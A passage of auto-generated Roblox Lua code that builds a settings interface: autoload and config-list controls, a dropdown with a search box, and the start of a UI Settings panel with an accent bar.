G2L["b5"] = Instance.new("Frame", G2L["ac"]);
G2L["b5"]["ZIndex"] = 90;
G2L["b5"]["BorderSizePixel"] = 0;
G2L["b5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b5"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["b5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b5"]["Name"] = [[fillbar]];
G2L["b5"]["BackgroundTransparency"] = 0.95;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.setautoload
G2L["b6"] = Instance.new("Frame", G2L["6d"]);
G2L["b6"]["BorderSizePixel"] = 0;
G2L["b6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b6"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["b6"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["b6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b6"]["Name"] = [[setautoload]];
G2L["b6"]["LayoutOrder"] = 8;
G2L["b6"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.setautoload.button
G2L["b7"] = Instance.new("TextButton", G2L["b6"]);
G2L["b7"]["BorderSizePixel"] = 0;
G2L["b7"]["TextTransparency"] = 1;
G2L["b7"]["TextSize"] = 14;
G2L["b7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b7"]["ZIndex"] = 49;
G2L["b7"]["BackgroundTransparency"] = 1;
G2L["b7"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["b7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b7"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.setautoload.button.UIPadding
G2L["b8"] = Instance.new("UIPadding", G2L["b7"]);
G2L["b8"]["PaddingTop"] = UDim.new(0, 2);
G2L["b8"]["PaddingRight"] = UDim.new(0, 3);
G2L["b8"]["PaddingLeft"] = UDim.new(0, 3);
G2L["b8"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.setautoload.button.buttonFrame
G2L["b9"] = Instance.new("Frame", G2L["b7"]);
G2L["b9"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["b9"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["b9"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["b9"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["b9"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.setautoload.button.buttonFrame.outlineStroke
G2L["ba"] = Instance.new("UIStroke", G2L["b9"]);
G2L["ba"]["Thickness"] = 2;
G2L["ba"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.setautoload.button.buttonFrame.buttonFade
G2L["bb"] = Instance.new("CanvasGroup", G2L["b9"]);
G2L["bb"]["BorderSizePixel"] = 0;
G2L["bb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bb"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bb"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["bb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bb"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.setautoload.button.buttonFrame.buttonFade.UIGradient
G2L["bc"] = Instance.new("UIGradient", G2L["bb"]);
G2L["bc"]["Rotation"] = 90;
G2L["bc"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.setautoload.button.text
G2L["bd"] = Instance.new("TextLabel", G2L["b7"]);
G2L["bd"]["ZIndex"] = 2;
G2L["bd"]["BorderSizePixel"] = 0;
G2L["bd"]["TextSize"] = 14;
G2L["bd"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bd"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["bd"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bd"]["BackgroundTransparency"] = 1;
G2L["bd"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["bd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bd"]["Text"] = [[Set as autoload]];
G2L["bd"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.setautoload.button.text.text
G2L["be"] = Instance.new("UIStroke", G2L["bd"]);
G2L["be"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.setautoload.fillbar
G2L["bf"] = Instance.new("Frame", G2L["b6"]);
G2L["bf"]["ZIndex"] = 90;
G2L["bf"]["BorderSizePixel"] = 0;
G2L["bf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bf"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["bf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bf"]["Name"] = [[fillbar]];
G2L["bf"]["BackgroundTransparency"] = 0.95;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.autoloadtext
G2L["c0"] = Instance.new("Frame", G2L["6d"]);
G2L["c0"]["BorderSizePixel"] = 0;
G2L["c0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c0"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["c0"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
G2L["c0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c0"]["Name"] = [[autoloadtext]];
G2L["c0"]["LayoutOrder"] = 10;
G2L["c0"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.autoloadtext.text
G2L["c1"] = Instance.new("TextLabel", G2L["c0"]);
G2L["c1"]["TextWrapped"] = true;
G2L["c1"]["ZIndex"] = 10;
G2L["c1"]["BorderSizePixel"] = 0;
G2L["c1"]["TextSize"] = 14;
G2L["c1"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["c1"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["c1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c1"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c1"]["BackgroundTransparency"] = 1;
G2L["c1"]["Size"] = UDim2.new(1, 0, 1.18729, 0);
G2L["c1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c1"]["Text"] = [[Autoload: none]];
G2L["c1"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.autoloadtext.text.UIPadding
G2L["c2"] = Instance.new("UIPadding", G2L["c1"]);
G2L["c2"]["PaddingTop"] = UDim.new(0, 2);
G2L["c2"]["PaddingRight"] = UDim.new(0, 6);
G2L["c2"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.autoloadtext.text.text
G2L["c3"] = Instance.new("UIStroke", G2L["c1"]);
G2L["c3"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown
G2L["c4"] = Instance.new("Frame", G2L["6d"]);
G2L["c4"]["BorderSizePixel"] = 0;
G2L["c4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c4"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["c4"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["c4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c4"]["Name"] = [[configlistdropdown]];
G2L["c4"]["LayoutOrder"] = 7;
G2L["c4"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button
G2L["c5"] = Instance.new("TextButton", G2L["c4"]);
G2L["c5"]["BorderSizePixel"] = 0;
G2L["c5"]["TextTransparency"] = 1;
G2L["c5"]["TextSize"] = 14;
G2L["c5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c5"]["ZIndex"] = 89;
G2L["c5"]["BackgroundTransparency"] = 1;
G2L["c5"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["c5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c5"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.UIPadding
G2L["c6"] = Instance.new("UIPadding", G2L["c5"]);
G2L["c6"]["PaddingTop"] = UDim.new(0, 2);
G2L["c6"]["PaddingRight"] = UDim.new(0, 3);
G2L["c6"]["PaddingLeft"] = UDim.new(0, 3);
G2L["c6"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.dropdownFrame
G2L["c7"] = Instance.new("Frame", G2L["c5"]);
G2L["c7"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["c7"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["c7"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["c7"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["c7"]["Name"] = [[dropdownFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.dropdownFrame.outlineStroke
G2L["c8"] = Instance.new("UIStroke", G2L["c7"]);
G2L["c8"]["Thickness"] = 2;
G2L["c8"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.dropdownFrame.buttonFade
G2L["c9"] = Instance.new("CanvasGroup", G2L["c7"]);
G2L["c9"]["BorderSizePixel"] = 0;
G2L["c9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c9"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c9"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["c9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c9"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.dropdownFrame.buttonFade.UIGradient
G2L["ca"] = Instance.new("UIGradient", G2L["c9"]);
G2L["ca"]["Rotation"] = 90;
G2L["ca"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.text
G2L["cb"] = Instance.new("TextLabel", G2L["c5"]);
G2L["cb"]["ZIndex"] = 2;
G2L["cb"]["BorderSizePixel"] = 0;
G2L["cb"]["TextSize"] = 14;
G2L["cb"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["cb"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cb"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["cb"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cb"]["BackgroundTransparency"] = 1;
G2L["cb"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["cb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cb"]["Text"] = [[--]];
G2L["cb"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.text.text
G2L["cc"] = Instance.new("UIStroke", G2L["cb"]);
G2L["cc"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.text.UIPadding
G2L["cd"] = Instance.new("UIPadding", G2L["cb"]);
G2L["cd"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.arrow
G2L["ce"] = Instance.new("TextButton", G2L["c5"]);
G2L["ce"]["BorderSizePixel"] = 0;
G2L["ce"]["TextSize"] = 12;
G2L["ce"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ce"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ce"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ce"]["ZIndex"] = 99;
G2L["ce"]["BackgroundTransparency"] = 1;
G2L["ce"]["Size"] = UDim2.new(0, 25, 1, 0);
G2L["ce"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ce"]["Text"] = [[â–²]];
G2L["ce"]["Name"] = [[arrow]];
G2L["ce"]["Rotation"] = 180;
G2L["ce"]["Position"] = UDim2.new(1, -25, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.search
G2L["cf"] = Instance.new("TextBox", G2L["c5"]);
G2L["cf"]["Visible"] = false;
G2L["cf"]["Name"] = [[search]];
G2L["cf"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["cf"]["PlaceholderColor3"] = Color3.fromRGB(201, 201, 201);
G2L["cf"]["BorderSizePixel"] = 0;
G2L["cf"]["TextWrapped"] = true;
G2L["cf"]["TextSize"] = 14;
G2L["cf"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cf"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["cf"]["PlaceholderText"] = [[Search...]];
G2L["cf"]["Size"] = UDim2.new(1, -25, 1, 0);
G2L["cf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cf"]["Text"] = [[]];
G2L["cf"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.search.UIPadding
G2L["d0"] = Instance.new("UIPadding", G2L["cf"]);
G2L["d0"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.search.text
G2L["d1"] = Instance.new("UIStroke", G2L["cf"]);
G2L["d1"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.fillbar
G2L["d2"] = Instance.new("Frame", G2L["c4"]);
G2L["d2"]["ZIndex"] = 90;
G2L["d2"]["BorderSizePixel"] = 0;
G2L["d2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d2"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["d2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d2"]["Name"] = [[fillbar]];
G2L["d2"]["BackgroundTransparency"] = 0.95;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistLABEL
G2L["d3"] = Instance.new("Frame", G2L["6d"]);
G2L["d3"]["BorderSizePixel"] = 0;
G2L["d3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d3"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["d3"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
G2L["d3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d3"]["Name"] = [[configlistLABEL]];
G2L["d3"]["LayoutOrder"] = 6;
G2L["d3"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistLABEL.text
G2L["d4"] = Instance.new("TextLabel", G2L["d3"]);
G2L["d4"]["TextWrapped"] = true;
G2L["d4"]["ZIndex"] = 10;
G2L["d4"]["BorderSizePixel"] = 0;
G2L["d4"]["TextSize"] = 14;
G2L["d4"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["d4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d4"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d4"]["BackgroundTransparency"] = 1;
G2L["d4"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["d4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d4"]["Text"] = [[Config list]];
G2L["d4"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistLABEL.text.UIPadding
G2L["d5"] = Instance.new("UIPadding", G2L["d4"]);
G2L["d5"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistLABEL.text.text
G2L["d6"] = Instance.new("UIStroke", G2L["d4"]);
G2L["d6"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload
G2L["d7"] = Instance.new("Frame", G2L["6d"]);
G2L["d7"]["BorderSizePixel"] = 0;
G2L["d7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d7"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["d7"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["d7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d7"]["Name"] = [[removeautoload]];
G2L["d7"]["LayoutOrder"] = 8;
G2L["d7"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.button
G2L["d8"] = Instance.new("TextButton", G2L["d7"]);
G2L["d8"]["BorderSizePixel"] = 0;
G2L["d8"]["TextTransparency"] = 1;
G2L["d8"]["TextSize"] = 14;
G2L["d8"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d8"]["ZIndex"] = 49;
G2L["d8"]["BackgroundTransparency"] = 1;
G2L["d8"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["d8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d8"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.button.UIPadding
G2L["d9"] = Instance.new("UIPadding", G2L["d8"]);
G2L["d9"]["PaddingTop"] = UDim.new(0, 2);
G2L["d9"]["PaddingRight"] = UDim.new(0, 3);
G2L["d9"]["PaddingLeft"] = UDim.new(0, 3);
G2L["d9"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.button.buttonFrame
G2L["da"] = Instance.new("Frame", G2L["d8"]);
G2L["da"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["da"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["da"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["da"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["da"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.button.buttonFrame.outlineStroke
G2L["db"] = Instance.new("UIStroke", G2L["da"]);
G2L["db"]["Thickness"] = 2;
G2L["db"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.button.buttonFrame.buttonFade
G2L["dc"] = Instance.new("CanvasGroup", G2L["da"]);
G2L["dc"]["BorderSizePixel"] = 0;
G2L["dc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["dc"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["dc"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["dc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["dc"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.button.buttonFrame.buttonFade.UIGradient
G2L["dd"] = Instance.new("UIGradient", G2L["dc"]);
G2L["dd"]["Rotation"] = 90;
G2L["dd"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.button.text
G2L["de"] = Instance.new("TextLabel", G2L["d8"]);
G2L["de"]["ZIndex"] = 2;
G2L["de"]["BorderSizePixel"] = 0;
G2L["de"]["TextSize"] = 14;
G2L["de"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["de"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["de"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["de"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["de"]["BackgroundTransparency"] = 1;
G2L["de"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["de"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["de"]["Text"] = [[Remove autoload]];
G2L["de"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.button.text.text
G2L["df"] = Instance.new("UIStroke", G2L["de"]);
G2L["df"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.fillbar
G2L["e0"] = Instance.new("Frame", G2L["d7"]);
G2L["e0"]["ZIndex"] = 90;
G2L["e0"]["BorderSizePixel"] = 0;
G2L["e0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e0"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["e0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e0"]["Name"] = [[fillbar]];
G2L["e0"]["BackgroundTransparency"] = 0.95;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside
G2L["e1"] = Instance.new("Frame", G2L["6a"]);
G2L["e1"]["BorderSizePixel"] = 0;
G2L["e1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e1"]["Size"] = UDim2.new(0, 176, 0, 255);
G2L["e1"]["Position"] = UDim2.new(-0.00038, 0, 0, 0);
G2L["e1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e1"]["Name"] = [[leftside]];
G2L["e1"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.UIListLayout
G2L["e2"] = Instance.new("UIListLayout", G2L["e1"]);
G2L["e2"]["Padding"] = UDim.new(0, 5);
G2L["e2"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab
G2L["e3"] = Instance.new("Frame", G2L["e1"]);
G2L["e3"]["BorderSizePixel"] = 0;
G2L["e3"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["e3"]["Size"] = UDim2.new(0, 176, 0, 160);
G2L["e3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e3"]["Name"] = [[uisettingsTab]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.uisettingsScript
G2L["e4"] = Instance.new("LocalScript", G2L["e3"]);
G2L["e4"]["Name"] = [[uisettingsScript]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.ACCENT
G2L["e5"] = Instance.new("Frame", G2L["e3"]);
G2L["e5"]["ZIndex"] = 99;
G2L["e5"]["BorderSizePixel"] = 0;
G2L["e5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e5"]["Size"] = UDim2.new(1, 0, 0, 4);
G2L["e5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e5"]["Name"] = [[ACCENT]];
G2L["e5"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.ACCENT.GuiColor
G2L["e6"] = Instance.new("Frame", G2L["e5"]);
G2L["e6"]["ZIndex"] = 99;
G2L["e6"]["BorderSizePixel"] = 0;
G2L["e6"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
G2L["e6"]["Size"] = UDim2.new(0, 174, 0, 2);
G2L["e6"]["Position"] = UDim2.new(0, 1, 0, 1);
G2L["e6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e6"]["Name"] = [[GuiColor]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.ACCENT.GuiColor.UICorner
G2L["e7"] = Instance.new("UICorner", G2L["e6"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.UIListLayout
G2L["e8"] = Instance.new("UIListLayout", G2L["e3"]);
G2L["e8"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
G2L["e8"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.TITLE
G2L["e9"] = Instance.new("Frame", G2L["e3"]);
G2L["e9"]["ZIndex"] = 99;
G2L["e9"]["BorderSizePixel"] = 0;
G2L["e9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e9"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["e9"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["e9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e9"]["Name"] = [[TITLE]];
G2L["e9"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.TITLE.text
G2L["ea"] = Instance.new("TextLabel", G2L["e9"]);
G2L["ea"]["TextWrapped"] = true;
G2L["ea"]["ZIndex"] = 99;
G2L["ea"]["BorderSizePixel"] = 0;
G2L["ea"]["TextSize"] = 14;
G2L["ea"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["ea"]["TextTransparency"] = 0.3;
G2L["ea"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ea"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ea"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ea"]["BackgroundTransparency"] = 1;
G2L["ea"]["Size"] = UDim2.new(0, 172, 0, 15);
G2L["ea"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ea"]["Text"] = [[UI Settings]];
G2L["ea"]["Name"] = [[text]];
G2L["ea"]["Position"] = UDim2.new(0.02273, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.TITLE.text.text
G2L["eb"] = Instance.new("UIStroke", G2L["ea"]);
G2L["eb"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.TITLE.text.UIPadding
